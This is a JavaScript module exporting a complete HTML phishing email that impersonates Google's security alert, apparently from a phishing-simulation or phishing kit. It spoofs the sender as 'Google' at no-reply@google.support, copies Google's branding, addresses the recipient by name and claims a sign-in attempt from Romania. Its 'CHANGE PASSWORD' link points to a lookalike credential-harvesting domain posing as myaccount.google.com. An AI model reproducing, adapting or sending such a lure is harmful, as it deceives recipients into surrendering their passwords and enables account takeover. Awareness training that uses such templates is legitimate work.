/* eslint-disable no-unused-vars */
export default ({ name, email }) => ({
	fromEmail: 'no-reply@google.support',
	fromName: 'Google',
	subject: 'Password compromise',
	letter: 'G',
	emailTemplateHtml: `    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
	  <html>
	  <head>
		  <title>Account Alert</title>
	  </head>
	  <body>
	  <table border="0" cellpadding="0" cellspacing="0" style="color: rgb(34, 34, 34); font-family: arial, sans-serif; font-size: 12.8px; max-width: 600px; background-color: rgb(255, 255, 255); margin-left: auto; margin-right: auto;">
		  <tbody>
			  <tr>
				  <td style="margin: 0px;">
				  <table border="0" cellpadding="0" cellspacing="0" width="100%">
					  <tbody>
						  <tr>
							  <td align="left" style="margin: 0px;"><img class="CToWUd" height="32" src="https://ci3.googleusercontent.com/proxy/EURRrDHt1LcCbHcRdDtMHOQPPMHe5FkDsMAHs66gxAIYzYD38Abpa1Fmy-ACuq2V1tI8GZdWA4FLsXjKM4iAD-CixwUocANswARkdK1ttXK-T1DDSfiUplKFys37dkM=s0-d-e1-ft#https://www.gstatic.com/accountalerts/email/googlelogo_color_188x64dp.png" style="display: block; width: 92px; min-height: 32px;" width="92" /></td>
							  <td align="right" style="margin: 0px;"><img class="CToWUd" height="32" src="https://ci6.googleusercontent.com/proxy/w8ACgsIEmhjGKodu731Z-VOiYfmXsRM4zd6F_w4_cKQ1JPXF_6Y_hEPR_iJKee33yGZ8zR6o_Q08vuYMKmetfyoGNtMpt1d5CU6z3xA=s0-d-e1-ft#https://www.gstatic.com/accountalerts/email/keyhole.png" style="display: block; width: 32px; min-height: 32px;" width="32" /></td>
						  </tr>
					  </tbody>
				  </table>
				  </td>
			  </tr>
			  <tr height="16">
			  </tr>
			  <tr>
				  <td style="margin: 0px;">
				  <table bgcolor="#D32F2F" border="0" cellpadding="0" cellspacing="0" style="min-width: 332px; max-width: 600px; border-width: 1px 1px 0px; border-top-style: solid; border-right-style: solid; border-left-style: solid; border-top-color: rgb(224, 224, 224); border-right-color: rgb(224, 224, 224); border-left-color: rgb(224, 224, 224); border-top-left-radius: 3px; border-top-right-radius: 3px;" width="100%">
					  <tbody>
						  <tr>
							  <td colspan="3" height="72px" style="margin: 0px;">&nbsp;</td>
						  </tr>
						  <tr>
							  <td style="margin: 0px;" width="32px">&nbsp;</td>
							  <td style="font-family: Roboto-Regular, Helvetica, Arial, sans-serif; margin: 0px; font-size: 24px; color: rgb(255, 255, 255); line-height: 1.25;">Someone has your password</td>
							  <td style="margin: 0px;" width="32px">&nbsp;</td>
						  </tr>
						  <tr>
							  <td colspan="3" height="18px" style="margin: 0px;">&nbsp;</td>
						  </tr>
					  </tbody>
				  </table>
				  </td>
			  </tr>
			  <tr>
				  <td style="margin: 0px;">
				  <table bgcolor="#FAFAFA" border="0" cellpadding="0" cellspacing="0" style="min-width: 332px; max-width: 600px; border-width: 0px 1px 1px; border-right-style: solid; border-left-style: solid; border-right-color: rgb(240, 240, 240); border-left-color: rgb(240, 240, 240); border-bottom-style: solid; border-bottom-color: rgb(192, 192, 192); border-bottom-left-radius: 3px; border-bottom-right-radius: 3px;" width="100%">
					  <tbody>
						  <tr height="16px">
							  <td rowspan="3" style="margin: 0px;" width="32px">&nbsp;</td>
							  <td style="margin: 0px;">&nbsp;</td>
							  <td rowspan="3" style="margin: 0px;" width="32px">&nbsp;</td>
						  </tr>
						  <tr>
							  <td style="margin: 0px;">
							  <table border="0" cellpadding="0" cellspacing="0" style="min-width: 300px;">
								  <tbody>
									  <tr>
										  <td style="font-family: Roboto-Regular, Helvetica, Arial, sans-serif; margin: 0px; font-size: 13px; color: rgb(32, 32, 32); line-height: 1.5;">Hi ${name},</td>
									  </tr>
									  <tr>
										  <td style="font-family: Roboto-Regular, Helvetica, Arial, sans-serif; margin: 0px; font-size: 13px; color: rgb(32, 32, 32); line-height: 1.5;">Someone just used your password to try sign in to your Google Account&nbsp;</td>
										  <table border="0" cellpadding="0" cellspacing="0" style="margin-top: 48px; margin-bottom: 48px;">
											  <tbody>
												  <tr valign="top">
													  <td style="font-family: arial, sans-serif; margin: 0px;" width="32px">&nbsp;</td>
													  <td style="font-family: arial, sans-serif; margin: 0px; line-height: 1.2;"><span style="font-family: Roboto-Regular, Helvetica, Arial, sans-serif; font-size: 16px;">Information:</span><br />
													  <span style="font-family: Roboto-Regular, Helvetica, Arial, sans-serif; color: rgb(114, 114, 114);">Friday, October 15, 2021 at 9:34:00 PM GMT-05:00<br />
													  Slatina, Romania<br />
													  Firefox browser</span></td>
												  </tr>
											  </tbody>
										  </table>
										  <b>Google stopped this sign-in attempt. You should change your password immediately.</b>
	  
										  <p><a href="https://myaccount.google.com-securitysettingpage.ml-security.org/signonoptions">CHANGE PASSWORD</a></p>
	  
										  Best,<br />
										  The Mail Team</td>
									  </tr>
								  </tbody>
							  </table>
							  </td>
						  </tr>
						  <tr height="32px">
						  </tr>
					  </tbody>
				  </table>
				  </td>
			  </tr>
			  <tr height="16">
			  </tr>
		  </tbody>
	  </table>
	  </body>
	  </html>`,
  });
  